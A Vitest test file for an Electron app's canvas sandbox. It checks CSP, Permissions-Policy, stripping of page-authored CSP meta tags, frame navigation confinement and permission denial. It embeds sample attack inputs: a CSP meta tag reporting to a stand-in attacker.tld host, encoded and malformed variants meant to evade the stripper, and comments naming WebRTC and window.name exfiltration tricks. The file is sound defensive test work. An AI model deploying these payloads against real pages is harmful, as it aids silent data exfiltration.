// Canvas content egress + frame confinement (adversarial review, 2026-08-15).
//
// `connect-src 'self'` governs FETCHES. These pin the three channels that are
// not fetches (WebRTC, a page-authored CSP `report-uri`, powerful features) and
// the main-process backstop on frame navigation, which `will-navigate` — a
// MAIN-FRAME-ONLY event — never covered.
//
// Everything here drives real behaviour: a served Response, or the listener the
// installer actually registered. Nothing asserts on source text.

import { describe, it, expect, beforeEach, afterAll, vi } from 'vitest'
import * as fs from 'fs'
import * as path from 'path'
import type { CanvasFrameNavigationDetails } from '../../../src/main/canvas/ccc-ux-protocol'

vi.mock('../../../src/main/ipc/setup-handlers', () => {
  const nodeFs = require('node:fs') as typeof import('node:fs')
  const nodeOs = require('node:os') as typeof import('node:os')
  const nodePath = require('node:path') as typeof import('node:path')
  const dir = nodeFs.mkdtempSync(nodePath.join(nodeOs.tmpdir(), 'ccc-ux-egress-'))
  return { getResourcesDirectory: () => dir }
})

const { getResourcesDirectory } = await import('../../../src/main/ipc/setup-handlers')
const store = await import('../../../src/main/canvas/canvas-store')
const {
  handleCccUxRequest,
  stripPageAuthoredCspMeta,
  isCanvasFrameNavigationAllowed,
  installCanvasFrameNavigationGuard,
  installCanvasPermissionGuard,
} = await import('../../../src/main/canvas/ccc-ux-protocol')

const SID = 'e9e9e9e9e9e9e9e9e9e9e9e9'

function get(url: string): Promise<Response> {
  return handleCccUxRequest(new Request(url))
}

/** Render a design version whose document is `html`; return its served body. */
async function serveDesign(html: string): Promise<{ body: string; res: Response }> {
  const { canvasId } = store.renderVersion(SID, { mode: 'design', html })
  const res = await get(`ccc-ux://${canvasId}/v1/index.html`)
  return { body: await res.text(), res }
}

beforeEach(() => {
  store._resetCanvasStoreForTest()
  fs.rmSync(path.join(getResourcesDirectory(), 'canvas'), { recursive: true, force: true })
})

afterAll(() => {
  try {
    fs.rmSync(getResourcesDirectory(), { recursive: true, force: true })
  } catch {
    /* best-effort temp cleanup */
  }
})

// ---------------------------------------------------------------------------
// Channel 1: WebRTC
// ---------------------------------------------------------------------------

describe('served CSP blocks WebRTC', () => {
  // An RTCPeerConnection with an attacker-supplied TURN server does DNS + UDP
  // during ICE gathering, carrying whatever the page put in `username`. No
  // fetch-directive covers it and Chromium's default is allow, so the CSP3
  // `webrtc` directive is the only thing that can refuse it.
  it('carries webrtc \'block\' on a design document', async () => {
    const { res } = await serveDesign('<!doctype html><html><head></head><body>x</body></html>')
    const directives = (res.headers.get('Content-Security-Policy') ?? '').split(';').map((d) => d.trim())
    expect(directives).toContain("webrtc 'block'")
  })

  it('carries webrtc \'block\' on a UAT document too', async () => {
    const dist = fs.mkdtempSync(path.join(getResourcesDirectory(), 'dist-'))
    fs.writeFileSync(path.join(dist, 'index.html'), '<!doctype html><html><body>u</body></html>')
    expect(store.registerCanvasUatRoot(SID, dist)).toBe(true)
    const { canvasId } = store.renderVersion(SID, { mode: 'uat', distRoot: dist })
    const res = await get(`ccc-ux://${canvasId}/v1/index.html`)
    const directives = (res.headers.get('Content-Security-Policy') ?? '').split(';').map((d) => d.trim())
    expect(directives).toContain("webrtc 'block'")
  })
})

// ---------------------------------------------------------------------------
// Channel 2 (partial): powerful features
// ---------------------------------------------------------------------------

describe('served Permissions-Policy denies powerful features', () => {
  it('denies camera/microphone/geolocation to every origin on a document', async () => {
    const { res } = await serveDesign('<!doctype html><html><body>x</body></html>')
    const policy = res.headers.get('Permissions-Policy') ?? ''
    for (const feature of ['camera', 'microphone', 'geolocation', 'display-capture', 'midi', 'usb']) {
      expect(policy.split(',').map((f) => f.trim())).toContain(`${feature}=()`)
    }
  })

  it('sends it on the bridge script response as well — the header is unconditional', async () => {
    const { canvasId } = store.renderVersion(SID, { mode: 'design', html: '<html><body>x</body></html>' })
    const res = await get(`ccc-ux://${canvasId}/__ccc__/canvas-bridge.js`)
    expect(res.status).toBe(200)
    expect(res.headers.get('Permissions-Policy') ?? '').toContain('camera=()')
  })
})

// ---------------------------------------------------------------------------
// Channel 3: a page-authored CSP report endpoint
// ---------------------------------------------------------------------------

describe('page-authored <meta http-equiv="Content-Security-Policy"> is removed at serve time', () => {
  const REPORT = 'default-src \'none\'; report-uri https://attacker.tld/x'

  it('removes the element from the served document', async () => {
    const { body } = await serveDesign(
      `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="${REPORT}"></head><body>hi</body></html>`,
    )
    expect(body).not.toContain('attacker.tld')
    expect(body).not.toMatch(/http-equiv/i)
    expect(body).toContain('hi') // the rest of the document is untouched
  })

  it('removes the report-only spelling, which is the one that only reports', () => {
    const out = stripPageAuthoredCspMeta(
      `<head><meta http-equiv="Content-Security-Policy-Report-Only" content="${REPORT}"></head>`,
    )
    expect(out).toBe('<head></head>')
  })

  it('is not dodged by a character reference in the http-equiv value', () => {
    // The tokenizer decodes references in attribute VALUES, so a comparison on
    // the raw text is one `&#x53;` away from being bypassed.
    const out = stripPageAuthoredCspMeta(
      `<head><meta http-equiv="Content-&#x53;ecurity-Policy" content="${REPORT}"></head>`,
    )
    expect(out).not.toContain('attacker.tld')
  })

  it('is not dodged by an unquoted value, odd spacing, or a > inside a quoted value', () => {
    expect(stripPageAuthoredCspMeta("<meta http-equiv=content-security-policy content='default-src *'>")).toBe('')
    expect(stripPageAuthoredCspMeta('<meta\n  HTTP-EQUIV = "  content-security-policy  "\n  content="x">')).toBe('')
    // `>` inside the quoted value: a `[^>]*>` scanner stops early and leaves the
    // pragma standing.
    const withGt = '<meta http-equiv="content-security-policy" content="default-src \'none\'; report-uri https://a.tld/?x=>y">'
    expect(stripPageAuthoredCspMeta(withGt)).not.toContain('http-equiv')
  })

  it('leaves other metas, and text that merely LOOKS like one, alone', () => {
    // Over-stripping is a real cost: rewriting the characters inside a script
    // string corrupts working dist output.
    const doc =
      '<head><meta charset="utf-8"><meta name="viewport" content="width=device-width">' +
      '<script>var s = "<meta http-equiv=\'content-security-policy\' content=\'x\'>"</script>' +
      '<!-- <meta http-equiv="content-security-policy" content="x"> --></head>'
    expect(stripPageAuthoredCspMeta(doc)).toBe(doc)
  })
})

// ---------------------------------------------------------------------------
// Frame navigation confinement
// ---------------------------------------------------------------------------

describe('a canvas frame may only navigate inside its own canvas+version', () => {
  const A = 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa/v1/index.html'

  it('allows the same version — reload and SPA routes still work', () => {
    expect(isCanvasFrameNavigationAllowed(A, A)).toBe(true)
    expect(isCanvasFrameNavigationAllowed(A, 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa/v1/about')).toBe(true)
  })

  it('refuses another canvas — the window.name cross-canvas theft primitive', () => {
    expect(isCanvasFrameNavigationAllowed(A, 'ccc-ux://bbbbbbbbbbbbbbbbbbbbbbbb/v1/index.html')).toBe(false)
  })

  it('refuses another VERSION of the same canvas — the snapshot version-confusion primitive', () => {
    expect(isCanvasFrameNavigationAllowed(A, 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa/v2/index.html')).toBe(false)
  })

  it('refuses leaving the scheme entirely, about:blank included', () => {
    expect(isCanvasFrameNavigationAllowed(A, 'https://attacker.tld/')).toBe(false)
    // about:blank is the stepping stone: reach it and the frame stops looking
    // like a canvas frame, so the next hop would be unguarded.
    expect(isCanvasFrameNavigationAllowed(A, 'about:blank')).toBe(false)
  })

  it('does not interfere with the initial mount from a non-canvas document', () => {
    expect(isCanvasFrameNavigationAllowed('about:blank', A)).toBe(true)
    expect(isCanvasFrameNavigationAllowed('', A)).toBe(true)
  })
})

describe('installCanvasFrameNavigationGuard', () => {
  function install(): (details: CanvasFrameNavigationDetails) => void {
    let listener: ((details: CanvasFrameNavigationDetails) => void) | null = null
    installCanvasFrameNavigationGuard({
      on(event, fn) {
        expect(event).toBe('will-frame-navigate')
        listener = fn
        return undefined
      },
    })
    expect(listener, 'guard registered no listener').toBeTruthy()
    return listener!
  }

  function fire(over: Partial<CanvasFrameNavigationDetails>): { prevented: boolean } {
    const listener = install()
    let prevented = false
    listener({
      url: 'ccc-ux://bbbbbbbbbbbbbbbbbbbbbbbb/v1/index.html',
      isMainFrame: false,
      frame: { url: 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa/v1/index.html' },
      preventDefault: () => {
        prevented = true
      },
      ...over,
    })
    return { prevented }
  }

  it('cancels a subframe navigation to another canvas', () => {
    expect(fire({}).prevented).toBe(true)
  })

  it('allows a navigation that stays inside the frame\'s own version', () => {
    expect(fire({ url: 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa/v1/deep/route' }).prevented).toBe(false)
  })

  it('still refuses when `frame` is null, using the initiator — a nullable-only input is an off switch', () => {
    const out = fire({
      frame: null,
      initiator: { url: 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa/v1/index.html' },
    })
    expect(out.prevented).toBe(true)
  })

  it('leaves the main frame to will-navigate', () => {
    expect(fire({ isMainFrame: true }).prevented).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// Permission requests
// ---------------------------------------------------------------------------

describe('installCanvasPermissionGuard', () => {
  function install(): {
    request: (permission: string, requestingUrl?: string) => boolean
    check: (permission: string, origin: string) => boolean
  } {
    let requestHandler: any = null
    let checkHandler: any = null
    installCanvasPermissionGuard({
      setPermissionRequestHandler: (h) => {
        requestHandler = h
      },
      setPermissionCheckHandler: (h) => {
        checkHandler = h
      },
    })
    expect(requestHandler, 'no permission request handler installed').toBeTruthy()
    expect(checkHandler, 'no permission check handler installed').toBeTruthy()
    return {
      request: (permission, requestingUrl) => {
        let granted: boolean | undefined
        requestHandler(null, permission, (g: boolean) => {
          granted = g
        }, { requestingUrl })
        expect(granted, 'handler never answered').toBeTypeOf('boolean')
        return granted!
      },
      check: (permission, origin) => checkHandler(null, permission, origin),
    }
  }

  it('denies every permission a canvas document asks for', () => {
    const { request } = install()
    for (const permission of ['geolocation', 'media', 'midi', 'clipboard-read', 'notifications', 'idle-detection']) {
      expect(request(permission, 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa/v1/index.html'), permission).toBe(false)
    }
  })

  it('denies the synchronous check for a canvas origin too', () => {
    const { check } = install()
    expect(check('media', 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa')).toBe(false)
  })

  it('does NOT deny the app\'s own renderer — the Copy buttons go through this handler', () => {
    // A blanket `() => false` closes the canvas hole by breaking
    // navigator.clipboard.write everywhere in the app.
    const { request, check } = install()
    expect(request('clipboard-sanitized-write', 'file:///C:/app/index.html')).toBe(true)
    expect(request('clipboard-sanitized-write', 'http://localhost:5173/')).toBe(true)
    expect(check('clipboard-sanitized-write', 'http://localhost:5173')).toBe(true)
  })

  it('denies a request that carries no requesting url only when it is a canvas one', () => {
    const { request } = install()
    // Unknown origin is the app's own window in practice; the canvas frames
    // always report theirs. Documented rather than silently either way.
    expect(request('geolocation', undefined)).toBe(true)
  })
})
